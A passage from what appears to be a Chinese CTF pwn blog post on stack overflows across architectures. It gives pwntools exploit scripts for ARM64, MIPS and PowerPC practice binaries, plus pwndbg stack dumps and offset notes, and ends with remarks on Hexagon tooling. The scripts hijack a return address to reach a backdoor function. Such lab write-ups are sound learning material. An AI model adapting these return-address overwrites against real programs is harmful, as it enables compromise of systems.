process([&#x27;qemu-aarch64&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;, &#x27;./arm64&#x27;])</span></span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">backdoor = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(backdoor))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;payload:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(backdoor))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x1z1@x1z1:~/Desktop/demo/MIPS$ file mips</span><br><span class="line">mips: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, BuildID[sha1]=d8b0cad52b541ec3f8be13cc80ecbeb232320c7e, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>同样还是调试。那我们就要去找<code>$ra</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">06:0018│ v0 t6 0x40800028 ◂— <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">07:001c│-014   0x4080002c ◂— 1</span><br><span class="line">pwndbg&gt; </span><br><span class="line">08:0020│-010 0x40800030 —▸ 0x40800044 —▸ 0x4007b0 (backdoor) ◂— 0x27bdffe0</span><br><span class="line">09:0024│-00c 0x40800034 ◂— 0x338808</span><br><span class="line">0a:0028│-008 0x40800038 —▸ 0x40800040 —▸ 0x4a589c (_dl_platform) ◂— 0</span><br><span class="line">0b:002c│-004 0x4080003c —▸ 0x4009b8 (main+204) ◂— 0x8fdc0010</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>main+204</code>就是vuln函数的返回地址。所以我们只要覆盖这里的地址就可以劫持返回地址了。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;big&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./mips&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process([&#x27;qemu-mips&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;./mips&#x27;])</span></span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">backdoor = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(backdoor))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;payload:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(backdoor))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>整体和arm64的payload差不多。但是由于这里是mips-32。所以要注意一下是大端序。</p>
+<h2 id="PowerPC"><a href="#PowerPC" class="headerlink" title="PowerPC"></a>PowerPC</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x1z1@x1z1:~/Desktop/demo/PowerPC$ file ppc</span><br><span class="line">ppc: ELF 32-bit MSB executable, PowerPC or cisco 4500, version 1 (SYSV), statically linked, BuildID[sha1]=56447bc3fbc1a79362deecc9c69fb52cd0bb9dca, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>看动态调试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">02:0008│ r3        0x407ffe98 ◂— &#x27;aaaa&#x27;</span><br><span class="line">03:000c│           0x407ffe9c ◂— 0x477215</span><br><span class="line">04:0010│           0x407ffea0 —▸ 0x40800134 —▸ 0x408002f5 ◂— &#x27;./ppc&#x27;</span><br><span class="line">05:0014│           0x407ffea4 ◂— 1</span><br><span class="line">06:0018│           0x407ffea8 —▸ 0x100bfff0 (_GLOBAL_OFFSET_TABLE_) ◂— 0</span><br><span class="line">07:001c│           0x407ffeac —▸ 0x407ffeb0 —▸ 0x407ffec0 —▸ 0x408000e0 —▸ 0x40800120 ◂— ...</span><br><span class="line">pwndbg&gt; </span><br><span class="line">08:0020│     0x407ffeb0 —▸ 0x407ffec0 —▸ 0x408000e0 —▸ 0x40800120 ◂— 0</span><br><span class="line">09:0024│     0x407ffeb4 —▸ 0x10000704 (main+132) ◂— 0x3d201007</span><br></pre></td></tr></table></figure>
+
+<p>这里距离返回地址<code>main+132</code>算一下偏移量就行。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;powerpc&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;big&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ppc&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process([&#x27;qemu-ppc&#x27;, &#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;./ppc&#x27;])</span></span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">backdoor = <span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(backdoor))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;payload:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span>+p32(backdoor))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>也是注意一个大端序的问题。</p>
+<p>最近在打nep的时候，发现有一个<code>hexagon</code>架构。六边形。但是那题还没复现出来。希望等到时候看大佬的exp能理解。希望不要是agent写的QAQ。</p>
+<p>然后上面三中的框架正常ida都是可以打开看伪代码的。但是hexagon不太行。需要安装插件：<a target="_blank" rel="noopener" href="https://github.com/n-o-o-n/idp_hexagon/">n-o-o-n&#x2F;idp_hexagon: Hexagon processor module for IDA Pro disassembler</a></p>
+<p>但是安装插接以后，还是缺少Decompiler。看不了伪代码。所以除非你能手撕汇编，不然根本看不懂。而且hexagon的汇编也要花时间去学。所以转向去用<code>Ghidra</code>。</p>
+<p>由于在hexagon架构下。C语言的库函数都是无法被识别的。所以导致我们逆向的难度会稍稍加大一点，我们不仅需要判断自定义函数，还需要判断库函数。同时gadget还很难找。删去了<code>pop push</code>等指令。就打算先咕了QWQ…</p>
+<p>借鉴：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15999">深入异构 PWN：PowerPC&amp;ARM&amp;MIPS-先知社区</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/07/16/%E5%BC%82%E6%9E%B6%E6%9E%84%E6%B1%87%E7%BC%96/">http://example.com/2026/07/16/%E5%BC%82%E6%9E%B6%E6%9E%84%E6%B1%87%E7%BC%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/IOT/">IOT</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/16/%E5%BC%82%E6%9E%B6%E6%9E%84%E6%B1%87%E7%BC%96/" title="异架构汇编">异架构汇编</a><time datetime="2026-07-16T07:39:14.000Z" title="发表于 2026-07-16 15:39:14">2026-07-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/05/Pwn%E5%85%A5%E9%97%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="Pwn入门环境搭建">Pwn入门环境搭建</a><time datetime="2026-07-05T15:10:51.827Z" title="发表于 2026-07-05 23:10:51">2026-07-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/04/Login/" title="Login">Login</a><time datetime="2026-06-04T01:52:38.000Z" title="发表于 2026-06-04 09:52:38">2026-06-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/29/House-of-some/" title="House of some">House of some</a><time datetime="2026-05-29T02:20:53.000Z" title="发表于 2026-05-29 10:20:53">2026-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/27/House-of-cat/" title="House of cat">House of cat</a><time datetime="2026-05-27T06:28:49.000Z" title="发表于 2026-05-27 14:28:49">2026-05-27</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IO/"><span class="card-category-list-name">IO</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">9</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">12</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn/" style="font-size: 1.5em; color: #99a9bf">pwn</a> <a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.3em; color: #99a1ac">pwn入门</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a> <a href="/tags/IOT/" style="font-size: 1.1em; color: #999">IOT</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.3em; color: #99a1ac">pwn进阶</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      <a class="card-more-btn" href="/archives/"
+            title="查看更多">
+            <i class="fas fa-angle-right"></i>
+          </a>
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/07/">
+            <span class="card-archive-list-date">
+              七月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/06/">
+            <span class="card-archive-list-date">
+              六月 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/05/">
+            <span class="card-archive-list-date">
+              五月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">5</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">9</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">6</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">36</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-07-22T07:43:59.301Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
